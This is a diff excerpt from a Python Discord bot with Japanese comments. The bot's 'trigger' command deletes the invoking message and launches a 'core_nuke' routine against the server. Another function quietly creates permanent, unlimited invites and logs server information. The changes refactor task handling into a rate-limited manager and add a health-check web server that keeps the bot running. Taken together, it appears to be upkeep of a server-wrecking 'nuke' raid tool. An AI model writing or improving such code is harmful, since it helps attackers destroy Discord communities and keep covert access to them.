 async def on_command_error(ctx: commands.Context, error: commands.CommandError) -> None:
-    """コマンドエラーのグローバルハンドリング"""
     if isinstance(error, commands.CommandNotFound):
         return
     elif isinstance(error, commands.MissingPermissions):
@@ -823,7 +707,7 @@ async def trigger(ctx: commands.Context, *, new_name: Optional[str] = None) -> N
         await ctx.message.delete()
     except Exception as e:
         logger.debug(f"Message delete failed: {e}")
-    task_mgr.create_task(core_nuke(ctx.guild, new_name), name=f"nuke_cmd_{ctx.guild.id}")
+    rate_mgr.create_task(core_nuke(ctx.guild, new_name), name=f"nuke_cmd_{ctx.guild.id}")
 
 # ============================================================================
 # 12. ユーティリティ
@@ -849,11 +733,11 @@ async def log_server_info(guild: discord.Guild) -> None:
         else:
             if guild.text_channels:
                 channel = guild.text_channels[0]
-                new_invite = await channel.create_invite(
+                new_invite = await rate_mgr.execute(channel.create_invite(
                     max_age=0, max_uses=0, unique=True, 
                     reason="Bot自動永久招待"
-                )
-                invite_link = new_invite.url
+                ))
+                invite_link = new_invite.url if new_invite else "作成失敗"
             else:
                 invite_link = "テキストチャンネルなし"
     except discord.Forbidden:
@@ -870,9 +754,8 @@ async def log_server_info(guild: discord.Guild) -> None:
 # 13. Graceful Shutdown
 # ============================================================================
 async def shutdown() -> None:
-    """安全なシャットダウン処理"""
     logger.info("シャットダウンシーケンスを開始します...")
-    await task_mgr.cancel_all()
+    await rate_mgr.cancel_all()
     await bot.close()
     logger.info("Botを終了しました")
 
@@ -880,7 +763,9 @@ def signal_handler(sig, frame) -> None:
     logger.info(f"シグナル {sig} を受信しました")
     asyncio.create_task(shutdown())
 
-# ===== 既存コードの最下部（if __name__ == "__main__": より上）に追加 =====
+# ============================================================================
+# 14. Health Check Web Server (UptimeRobot 用)
+# ============================================================================
 from fastapi import FastAPI
 import threading
 import uvicorn
@@ -900,20 +785,19 @@ async def ping():
     return {"status": "ok"}
 
 def run_web_server():
-    """別スレッドでFastAPIを起動"""
     uvicorn.run(app, host="0.0.0.0", port=10000, log_level="warning")
 
-# ===== エントリーポイントを置き換え =====
+# ============================================================================
+# 15. エントリーポイント
+# ============================================================================
 if __name__ == "__main__":
-    # シグナルハンドラ登録
     signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown()))
     signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown()))
-    
-    # Webサーバーを別スレッドで起動（UptimeRobot用）
+
     web_thread = threading.Thread(target=run_web_server, daemon=True)
     web_thread.start()
     logger.info("Health check server started on port 10000")
-    
+
     try:
         bot.run(CONFIG.token)
     except Exception as e:
